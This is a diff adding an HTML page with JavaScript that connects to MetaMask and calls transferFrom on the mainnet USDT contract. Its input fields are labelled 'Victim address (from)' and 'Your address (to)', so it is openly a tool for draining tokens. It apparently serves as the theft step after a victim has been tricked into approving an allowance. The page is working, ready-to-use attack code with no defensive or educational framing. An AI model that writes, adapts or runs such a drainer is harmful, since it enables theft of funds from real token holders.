@@ -1,0 +1,99 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>USDT TransferFrom (compatible)</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      padding: 2rem;
+      background: #f4f4f4;
+      text-align: center;
+    }
+    .container {
+      background: white;
+      padding: 2rem;
+      border-radius: 12px;
+      max-width: 400px;
+      margin: auto;
+      box-shadow: 0 0 10px rgba(0,0,0,0.1);
+    }
+    input, button {
+      padding: 0.8rem;
+      margin: 0.5rem 0;
+      width: 100%;
+      font-size: 1rem;
+    }
+    button {
+      background: #007bff;
+      color: white;
+      border: none;
+      border-radius: 8px;
+    }
+    #status {
+      margin-top: 1rem;
+      font-size: 0.9rem;
+      color: #333;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h2>TransferFrom USDT</h2>
+    <input type="text" id="from" placeholder="Victim address (from)">
+    <input type="text" id="to" placeholder="Your address (to)">
+    <input type="number" id="amount" placeholder="Amount (e.g. 10)">
+    <button onclick="doTransferFrom()">Execute transferFrom</button>
+    <div id="status"></div>
+  </div>
+
+  <script>
+    const usdtAddress = "0xdAC17F958D2ee523a2206206994597C13D831ec7"; // USDT mainnet
+
+    async function doTransferFrom() {
+      const status = document.getElementById("status");
+      const from = document.getElementById("from").value.trim();
+      const to = document.getElementById("to").value.trim();
+      const amount = document.getElementById("amount").value.trim();
+
+      if (!window.ethereum) {
+        status.textContent = "❌ MetaMask not detected.";
+        return;
+      }
+
+      try {
+        await ethereum.request({ method: "eth_requestAccounts" });
+        const provider = new ethers.providers.Web3Provider(window.ethereum);
+        const signer = provider.getSigner();
+
+        const decimals = 6;
+        const amountInUnits = ethers.BigNumber.from(amount).mul(ethers.BigNumber.from("10").pow(decimals));
+
+        const iface = new ethers.utils.Interface([
+          "function transferFrom(address from, address to, uint256 value)"
+        ]);
+        const data = iface.encodeFunctionData("transferFrom", [from, to, amountInUnits]);
+
+        const txParams = {
+          from: await signer.getAddress(),
+          to: usdtAddress,
+          data: data
+        };
+
+        status.textContent = "⏳ Sending transaction...";
+        const txHash = await ethereum.request({
+          method: "eth_sendTransaction",
+          params: [txParams]
+        });
+
+        status.textContent = "✅ Transaction sent! TX Hash: " + txHash;
+      } catch (err) {
+        console.error(err);
+        status.textContent = "❌ Error: " + (err.message || err);
+      }
+    }
+  </script>
+</body>
+</html>
